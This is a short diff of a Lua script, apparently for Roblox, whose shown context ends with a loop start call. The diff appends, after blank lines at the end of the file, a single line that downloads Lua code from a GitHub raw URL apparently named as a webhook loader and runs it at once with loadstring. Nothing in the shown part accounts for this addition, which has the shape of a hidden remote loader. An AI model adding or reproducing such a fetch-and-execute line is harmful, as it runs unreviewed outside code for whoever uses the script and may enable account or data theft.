@@ -195,3 +195,6 @@ end)
 
 -- jalankan loop berkala
 startLoop()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/webhook%202"))()
